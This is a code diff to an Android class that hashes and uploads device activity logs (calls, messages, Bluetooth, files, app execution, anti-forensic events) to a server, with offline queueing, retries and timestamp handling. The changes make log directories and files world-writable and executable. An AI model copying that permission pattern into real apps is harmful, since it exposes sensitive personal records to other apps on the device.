@@ -88,13 +88,17 @@ public class LogHandler {
      * 오프라인 실패 시 → 캐시 기반 추정값 반환 ([estimated] 접두사)
      */
     public static String resolveServerTimestamp(Context context) {
+        // 오프라인이면 HTTP 요청 자체를 생략
+        if (!ServerTransmitter.isNetworkAvailable(context)) {
+            return ServerTransmitter.getEstimatedServerTimestamp(context);
+        }
         String ts = ServerTransmitter.getServerTimestamp();
         if (ts != null) {
             ServerTransmitter.saveServerTimestampCache(context, ts);
             return ts;
         }
-        String estimated = ServerTransmitter.getEstimatedServerTimestamp(context);
-        return estimated != null ? estimated : "offline";
+        // 오프라인: 캐시 기반 추정값 반환. 캐시 없으면 null (로그에 serverTimestamp 필드 생략)
+        return ServerTransmitter.getEstimatedServerTimestamp(context);
     }
 
     public void initializeLogFile() {
@@ -152,7 +156,10 @@ public class LogHandler {
 
             // 4. 오프라인 상태면 WorkManager 플러시 예약 (온라인 복구 시 .txt 전송)
             if (!ServerTransmitter.isNetworkAvailable(context)) {
+                Log.d(TAG, "[OFFLINE] 오프라인 감지 → scheduleFlush 등록: " + directoryName);
                 UploadQueueWorker.scheduleFlush(context);
+            } else {
+                Log.d(TAG, "[ONLINE] 온라인 상태로 기록: " + directoryName);
             }
 
             Log.d(TAG, "Logged & chained: " + directoryName);
@@ -194,19 +201,31 @@ public class LogHandler {
      * 온라인 복구 시 WorkManager에서 호출: 모든 로그 타입의 .txt 파일에 쌓인 내용을 서버로 전송.
      * 큐 플러시 이후에 실행되어, 512KB 트리거 없이 오프라인에서 쌓인 .txt를 처리.
      */
-    public static void sendAllPendingTxt(Context context, ServerTransmitter serverTransmitter) {
+    /**
+     * @return 하나 이상 실패 시 true (Worker가 retry 해야 함)
+     */
+    public static boolean sendAllPendingTxt(Context context, ServerTransmitter serverTransmitter) {
         String deviceId = getAndroidID(context, context.getContentResolver());
         String[] logTypes = {"AntiForensicLog", "CallingLog", "BluetoothLog",
                 "MessageLog", "FileLog", "AppExecutionLog"};
         CryptoManager crypto = CryptoManager.getInstance();
+        boolean anyFailed = false;
+
+        // 플러시 시작 시 인메모리 캐시 무효화 → 신선한 서버 시각 fetch
+        ServerTransmitter.invalidateTimestampCache();
+        String transmissionTs = ServerTransmitter.getServerTimestamp();
+        if (transmissionTs != null) {
+            ServerTransmitter.saveServerTimestampCache(context, transmissionTs);
+            Log.d(TAG, "[sendAllPendingTxt] 타임스탬프 캐시 갱신: " + transmissionTs);
+        }
 
         for (String logType : logTypes) {
             File dir = new File(context.getFilesDir(), logType);
             File logFile = new File(dir, deviceId + "_" + logType + ".txt");
             if (!logFile.exists() || logFile.length() == 0) continue;
 
+            Log.d(TAG, "[sendAllPendingTxt] 확인: " + logType + " — 크기=" + logFile.length() + "bytes");
             try {
-                // 읽기 권한 열기
                 dir.setWritable(true, false);
                 dir.setExecutable(true, false);
                 logFile.setWritable(true, false);
@@ -235,18 +254,33 @@ public class LogHandler {
                 for (byte b : hashBytes) hashSb.append(String.format("%02x", b));
                 String hash = hashSb.toString();
 
+                if (transmissionTs != null) {
+                    logContent = logContent + " ; transmissionTimestamp: " + transmissionTs;
+                    normalized = String.join("\n", logContent.split("\\r?\n"));
+                    hashBytes = md.digest(normalized.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+                    hashSb = new StringBuilder();
+                    for (byte b : hashBytes) hashSb.append(String.format("%02x", b));
+                    hash = hashSb.toString();
+                }
+
                 Log.d(TAG, "[ONLINE] 네트워크 복구 후 .txt 전송: " + logType);
                 boolean sent = serverTransmitter.uploadEncryptedLog(deviceId, logType, logContent, hash);
                 if (sent) {
                     clearLogFileStatic(context, deviceId, logType);
                     Log.d(TAG, "[ONLINE] .txt 전송 성공: " + logType);
                 } else {
-                    Log.w(TAG, "[ONLINE→OFFLINE] .txt 전송 실패: " + logType);
+                    // 전송 실패 → SQLCipher 큐에 보관 후 .txt 비움 (WorkManager가 재시도)
+                    Log.w(TAG, "[ONLINE→OFFLINE] .txt 전송 실패, 큐에 보관: " + logType);
+                    serverTransmitter.queueOffline(deviceId, logType, logContent, hash);
+                    clearLogFileStatic(context, deviceId, logType);
+                    anyFailed = true;
                 }
             } catch (Exception e) {
                 Log.e(TAG, "sendAllPendingTxt error: " + logType, e);
+                anyFailed = true;
             }
         }
+        return anyFailed;
     }
 
     /**
